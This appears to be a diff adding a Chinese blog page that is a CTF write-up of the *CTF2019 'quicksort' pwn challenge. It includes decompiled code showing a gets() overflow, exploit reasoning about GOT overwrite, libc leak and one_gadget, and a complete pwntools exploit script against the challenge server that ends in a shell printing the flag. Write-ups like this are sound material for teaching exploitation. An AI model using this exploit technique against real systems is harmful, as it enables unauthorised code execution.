@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>star_ctf | 枫云阁</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="star_ctf | 枫云阁">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hello-world2">
+<meta property="og:url" content="https://primelyw.github.io/2020/04/02/hello-world2/index.html">
+<meta property="og:site_name" content="枫云阁">
+<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:image" content="https://primelyw.github.io/.io//home.png">
+<meta property="article:published_time" content="2020-04-01T17:16:08.000Z">
+<meta property="article:modified_time" content="2020-04-01T17:18:31.830Z">
+<meta property="article:author" content="枫云李">
+<meta property="article:tag" content="Pwning">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://primelyw.github.io/.io//home.png">
+
+
+<link rel="icon" href="/img/avatar2.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/github.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.0.1" ></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value="">
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar2.jpg" />
+</a>
+<div class="author">
+    <span>枫云李</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="github" href="https://github.com/primelyw" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(17)</small></div></li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    </div>
+    <div><a  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="17">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://blog.plusls.com/">师父</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="Search..." />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Pwn</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">CTF</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">Defcon</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class=""
+           href="/2019/04/29/star_ctf/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="star_ctf">star_ctf</span>
+            <span class="post-date" title="2019-04-29 00:00:00">2019/04/29</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/04/30/shellcode/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="shellcode">shellcode</span>
+            <span class="post-date" title="2019-04-30 00:00:00">2019/04/30</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/05/01/finance/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="finance">finance</span>
+            <span class="post-date" title="2019-05-01 00:00:00">2019/05/01</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/05/10/pwning/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="pwning">pwning</span>
+            <span class="post-date" title="2019-05-10 00:00:00">2019/05/10</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/05/26/QWB/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="QWB">QWB</span>
+            <span class="post-date" title="2019-05-26 00:00:00">2019/05/26</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/05/26/assembly/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="assembly">assembly</span>
+            <span class="post-date" title="2019-05-26 00:00:00">2019/05/26</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/07/07/git_handbook/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="git handbook">git handbook</span>
+            <span class="post-date" title="2019-07-07 00:00:00">2019/07/07</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/07/11/server_misc/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="server_misc">server_misc</span>
+            <span class="post-date" title="2019-07-11 00:00:00">2019/07/11</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/07/18/tmux/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="tmux">tmux</span>
+            <span class="post-date" title="2019-07-18 00:00:00">2019/07/18</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/10/20/heap_details/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="heap_details">heap_details</span>
+            <span class="post-date" title="2019-10-20 00:00:00">2019/10/20</span>
+        </a>
+        
+        <a  class=""
+           href="/2020/02/10/nullcon/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="nullcon">nullcon</span>
+            <span class="post-date" title="2020-02-10 00:00:00">2020/02/10</span>
+        </a>
+        
+        <a  class=""
+           href="/2020/04/01/hello-world/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Hello World">Hello World</span>
+            <span class="post-date" title="2020-04-01 23:49:33">2020/04/01</span>
+        </a>
+        
+        <a  class=""
+           href="/2020/04/02/Defcon2019Q/"
+           data-tag="Pwn,CTF,Defcon"
+           data-author="" >
+            <span class="post-title" title="Defcon2019Q">Defcon2019Q</span>
+            <span class="post-date" title="2020-04-02 00:00:00">2020/04/02</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/11/07/Advance-rop/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Advance-rop">Advance-rop</span>
+            <span class="post-date" title="2019-11-07 09:50:48">2019/11/07</span>
+        </a>
+        
+        <a  class=""
+           href="/2020/04/02/hello-world2/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="hello-world2">hello-world2</span>
+            <span class="post-date" title="2020-04-02 01:16:08">2020/04/02</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/07/22/Pwner/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="pwner">pwner</span>
+            <span class="post-date" title="2019-07-22 00:00:00">2019/07/22</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/04/30/elf_protector/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="elf_protector">elf_protector</span>
+            <span class="post-date" title="2019-04-30 00:00:00">2019/04/30</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-star_ctf" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">star_ctf</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-01-16 13:17:52'>2019-04-29 00:00</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF2019"><span class="toc-text">*CTF2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode"><span class="toc-text">shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#check"><span class="toc-text">check</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Thought"><span class="toc-text">Thought</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solution"><span class="toc-text">Solution</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#check-1"><span class="toc-text">check</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Thought-1"><span class="toc-text">Thought</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solution-1"><span class="toc-text">Solution</span></a></li></ol></li></ol></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CTF2019"><a href="#CTF2019" class="headerlink" title="*CTF2019"></a>*CTF2019</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><h4 id="check"><a href="#check" class="headerlink" title="check"></a>check</h4><h4 id="Thought"><a href="#Thought" class="headerlink" title="Thought"></a>Thought</h4><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>###quicksort</p>
+<h4 id="check-1"><a href="#check-1" class="headerlink" title="check"></a>check</h4><pre><code class="shell">checksec quicksort
+[*] &#39;/ctf/work/star/quicksort/quicksort&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)</code></pre>
+<pre><code class="c">check ida
+
+
+unsigned int main2()
+{
+  int *v0; // ebx
+  char s; // [esp+Ch] [ebp-2Ch]
+  char v3; // [esp+Dh] [ebp-2Bh]
+  char v4; // [esp+Eh] [ebp-2Ah]
+  char v5; // [esp+Fh] [ebp-29h]
+  char v6; // [esp+10h] [ebp-28h]
+  char v7; // [esp+11h] [ebp-27h]
+  char v8; // [esp+12h] [ebp-26h]
+  char v9; // [esp+13h] [ebp-25h]
+  char v10; // [esp+14h] [ebp-24h]
+  char v11; // [esp+15h] [ebp-23h]
+  char v12; // [esp+16h] [ebp-22h]
+  char v13; // [esp+17h] [ebp-21h]
+  char v14; // [esp+18h] [ebp-20h]
+  char v15; // [esp+19h] [ebp-1Fh]
+  char v16; // [esp+1Ah] [ebp-1Eh]
+  char v17; // [esp+1Bh] [ebp-1Dh]
+  int v18; // [esp+1Ch] [ebp-1Ch]
+  int i; // [esp+20h] [ebp-18h]
+  int j; // [esp+24h] [ebp-14h]
+  void *ptr; // [esp+28h] [ebp-10h]
+  unsigned int v22; // [esp+2Ch] [ebp-Ch]
+
+  v22 = __readgsdword(0x14u);
+  v3 = 0;
+  v4 = 0;
+  v5 = 0;
+  v6 = 0;
+  v7 = 0;
+  v8 = 0;
+  v9 = 0;
+  v10 = 0;
+  v11 = 0;
+  v12 = 0;
+  v13 = 0;
+  v14 = 0;
+  v15 = 0;
+  v16 = 0;
+  v17 = 0;
+  s = 0;
+  v18 = 0;
+  puts(&quot;how many numbers do you want to sort?&quot;);
+  __isoc99_scanf(&quot;%d&quot;, &amp;v18);
+  getchar();
+  ptr = malloc(4 * v18);
+  for ( i = 0; i &lt; v18; ++i )
+  {
+    printf(&quot;the %dth number:&quot;, i + 1);
+    gets(&amp;s);
+    v0 = (int *)((char *)ptr + 4 * i);
+    *v0 = atoi(&amp;s);
+  }
+  sort1((int)ptr, 0, v18 - 1);
+  puts(&quot;Here is the result:&quot;);
+  for ( j = 0; j &lt; v18; ++j )
+    printf(&quot;%d &quot;, *((_DWORD *)ptr + j));
+  puts(&amp;byte_8048AD2);
+  free(ptr);
+  return __readgsdword(0x14u) ^ v22;
+}</code></pre>
+<h4 id="Thought-1"><a href="#Thought-1" class="headerlink" title="Thought"></a>Thought</h4><ul>
+<li><input checked disabled type="checkbox"> <p>字符数组的s溢出可以覆盖ptr, i, j 。</p>
+</li>
+<li><input checked disabled type="checkbox"> <p>改free_got到main_txt，目的用于重复输入</p>
+</li>
+<li><input checked disabled type="checkbox"> <p>利用printf(“%d”)来泄漏 函数在got表的真实地址，得到libc基地址</p>
+</li>
+<li><input checked disabled type="checkbox"> <p>one_gadget寻找execv</p>
+</li>
+<li><input checked disabled type="checkbox"> <pre><code class="shell">0x3ac5c execve(&quot;/bin/sh&quot;, esp+0x28, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x28] == NULL
+
+0x3ac5e execve(&quot;/bin/sh&quot;, esp+0x2c, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x2c] == NULL
+
+0x3ac62 execve(&quot;/bin/sh&quot;, esp+0x30, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x30] == NULL</code></pre>
+</li>
+<li><input checked disabled type="checkbox"> <p>修改free_got到one,然后成功pwn掉。</p>
+</li>
+</ul>
+<pre><code class="sehll">root@prime:/ctf/work/star/quicksort# ./p.py 
+[+] Opening connection to 34.92.96.238 on port 10000: Done
+[+] -136733602
+[*] Switching to interactive mode
+Here is the result:
+
+$ ls
+chall
+flag
+pwn
+$ cat flag
+*CTF{lSkR5u3LUh8qTbaCINgrjdJ74iE9WsDX}</code></pre>
+<h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h4><pre><code class="python">#!/usr/bin/env python
+from pwn import *
+import ctypes
+#p = process(&#39;./quicksort&#39;)
+#nc 34.92.96.238 10000
+p = remote(&#39;34.92.96.238&#39;,10000)
+
+debug = 0
+if debug:
+    context.log_level = &#39;debug&#39;    
+    context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
+    gdb.attach(p)
+
+libc_start_got = 0x804a030
+#[0x804a018] free
+main2_addr = 0x8048816 #134514710
+free_got = 0x804a018
+puts_got = 0x804a02c
+
+puts_plt = 0x8048560  #134514016
+printf_plt = 0x80484f0 #134513904
+puts_libc = 0x5fca0
+one = 0x3ac5e#0x3ac62
+
+
+p.sendlineafter(&#39;to sort?&#39;,&#39;1&#39;)
+pay = str(main2_addr)+&#39;\x00&#39;+&#39;\x00&#39;*(0x2c-0xa-0x1c)+p32(1)+p32(0)+p32(0)+p32(free_got)
+p.sendlineafter(&#39;number:&#39;,pay)
+
+
+p.sendlineafter(&#39;to sort?&#39;,&#39;1&#39;)
+pay = str(printf_plt)+&#39;\x00&#39;+&#39;\x00&#39;*(0x2c-0xa-0x1c)+p32(1)+p32(1)+p32(0)+p32(puts_got)
+p.sendlineafter(&#39;number:&#39;,pay)
+
+p.recvline()
+x = ctypes.c_uint(int(p.recvline())).value
+one_real = x + one-puts_libc
+one_real = ctypes.c_int(one_real).value
+#print len(str(one_real))
+log.success(one_real)
+
+p.sendlineafter(&#39;to sort?&#39;,&#39;1&#39;)
+pay = str(one_real)+&#39;\x00&#39;*(0x2c-0xa-0x1c)+p32(0)+p32(0)+p32(0)+p32(free_got)#+&#39;\x00&#39;*100
+p.sendlineafter(&#39;number:&#39;,pay)
+
+p.interactive()</code></pre>
+<p>x</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论。 </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>star_ctf</p>
+    
+    <p><span class="copy-title">本文作者:</span><a  title="枫云李">枫云李</a></p>
+    <p><span class="copy-title">发布时间:</span>2019-04-29, 00:00:00</p>
+    <p><span class="copy-title">最后更新:</span>2020-01-16, 13:17:52</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/04/29/star_ctf/" title="star_ctf">https://primelyw.github.io/2019/04/29/star_ctf/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2020 枫云李</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#Pwn','#CTF','#Defcon',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().trim().split('\n').length, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("/img/article-list-bg.jpg");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+    .post .pjax article :not(pre) > code {
+        color: #24292e;
+        font-family: SFMono-Regular,Consolas,Liberation Mono,Menlo,Courier,monospace;
+        background-color: rgba(27,31,35,.05);
+        border-radius: 3px;
+        font-size: 85%;
+        margin: 0;
+        padding: .2em .4em;
+    }
+    
+</style>
+
+
+
+
+
+
+
+</html>
